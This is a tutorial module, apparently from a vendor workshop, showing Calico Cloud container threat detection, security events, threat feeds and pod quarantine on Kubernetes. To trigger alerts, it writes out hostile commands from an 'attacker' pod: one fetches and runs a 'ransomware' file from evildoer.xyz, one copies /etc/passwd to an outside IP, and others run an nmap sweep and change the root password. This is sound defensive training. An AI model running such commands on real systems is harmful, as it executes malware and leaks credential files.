# Module 3 - Malware protection, access control and quarantine with Thread Defence

Calico Cloud provides a threat detection engine that analyzes observed file and process activity to detect known malicious and suspicious activity.

Our threat detection engine also monitors activity within the containers running in your clusters to detect suspicious behaviour and generate corresponding alerts. The threat detection engine monitors the following types of suspicious activity within containers:

- Access to sensitive system files and directories
- Defence evasion
- Discovery
- Execution
- Persistence
- Privilege escalation

1. Let's start by enabling the container threat detection feature.
   For this, go to the `Threat Defense` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`.

2. Navigate to `Threat Defense > Container Threat Detection` and click the `Enable Container Threat Detection` button.

   ![enable-threat-detection](https://github.com/tigera-solutions/cc-eks-visualize-identify-security-gaps/assets/104035488/89d290a7-2aef-4a6b-8813-11bf94db2577)

   Perfect! Now, any suspicious activities will generate an alert. Let's try some.

   To see the results faster, execute the following on the cluster:

   ```bash
   kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
   kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
   ```

## Malware execution alert and security events

Security events suggest the possible presence of a threat actor in your Kubernetes cluster. These events can take various forms, such as a DNS request to a suspicious domain, the activation of a Web Application Firewall (WAF) rule, unauthorized access to sensitive files, or the detection of malware. Calico Cloud offers a centralized dashboard for security engineers and incident response teams to efficiently oversee and respond to these threat alerts. The advantages of using Calico Cloud in this context include:

- A filtered list of critical events with recommended remediation
- Identify impacts on applications
- Understand the scope and frequency of the issue
- Manage alert noise by dismissing events (show/hide)

To test this feature, we can download a file containing the hash of malware and execute it inside the pod attacker.

1. Execute the bash inside the pod attack in the way you can interact with its shell prompt:

   ```bash
   kubectl exec attacker -it -- /bin/bash
   ```

2. From the bash inside the pod `attacker`, execute the following command to download the malware, change its permission and run it.

   ```bash
   wget http://evildoer.xyz/ransomware
   chmod +x ransomware
   ./ransomware
   ```
   
3. Wait a minute and look in the Calico Cloud UI in the `Threat Defense` > `Security Events`.

   ![security-events](https://github.com/tigera-solutions/cc-eks-visualize-identify-security-gaps/assets/104035488/0264703a-ff38-4fc5-b65a-24ef187803ee)

   Because the `ransomware` file has a hash that identifies it as malware, Calico will create a **Malware** event indicating its execution event. Additionally, a security event showing the modification of the file permission (`chmod +x ransomware`) will be created as well.

   Optionally, you can also try the following commands and observe the security events that are created;
   
   ```bash
   apk add nmap
   nmap -sn $(hostname -i)/24
   passwd root
   scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
   ```
   Wait another minute and look in the Calico Cloud UI in the `Threat Defense` > `Security` again.

## Threat Feeds

In modern cloud-native security, threat intelligence feeds are vital for monitoring and tracking the IP addresses and domains associated with known malicious actors. Calico Cloud integrates threat intelligence feeds, including AlienVault, into its default security policies. This means that right from the outset, any traffic directed to suspicious IP addresses or domains is automatically blocked without requiring additional setup.

1. Explore the Threat Feeds available in Calico Cloud UI in the `Threat Defense` > `Threat Feeds`. Click on each one to visualize the lists of IP addresses or domains.

   ![threat-feeds](https://github.com/tigera-solutions/cc-eks-visualize-identify-security-gaps/assets/104035488/b4bad2fb-9698-476f-8a58-f80a3747f11b)

2. Using the pod attacker, try to connect to some of the IP addresses and domains you found in the alienvault lists.

   ```bash
   curl -m2 -vvvvv 
   ```

3. Wait a minute and go to the Calico Cloud UI in the `Activity` > `Alerts`. You should be able to see the alerts for the connection attempt.

   ![activity-alerts](https://github.com/tigera-solutions/cc-eks-visualize-identify-security-gaps/assets/104035488/dadb5ce6-db8a-455c-bdcc-f26625841ffe)

## Quarantine a workload

Suppose you have a compromised workload in your environment and want to conduct further investigation on it. In that case, you should not terminate the workload but isolate it so it will not be able to cause damage or spread laterally across your environment. In this situation, you should quarantine the pod by applying a security policy that will deny all the egress and ingress traffic and log all the communications attempts from and to that pod.

We have the `quarantine` policy created in the `security` tier. This policy has a label selector of `quarantine = true`. Let's see how it works.

1. Execute the following commands from the attacker pod (if you did quit from its shell, it got deleted. Create it again if that's the case.).

   - Test the connection to a local service

     ```bash
     curl -m3 http://vote.vote
     ```

   - Test the connectivity with the Kubernetes API

     ```bash
     curl -m3 -k https://kubernetes:443/versions
     ```  

   - Test the connectivity with the internet

     ```bash
     curl -m3 http://neverssl.com
     ```  

2. Label the attacker pod with `quarantine = true`. 

   ```bash
   kubectl label pod attacker quarantine=true
   ```

3. Repeat the tests from step 1. Now, as you can see, they cannot establish communication with any of the destinations.

--- 
[:arrow_right: Module 4 - Enforcing security policy to stop C&C attacks](/mod/module-4-security-policies.md)   <br>

[:arrow_left: Module 2 - Analyze service-to-service communication](/mod/module-2-analyze-communications.md)  
[:leftwards_arrow_with_hook: Back to Main](/README.md)  
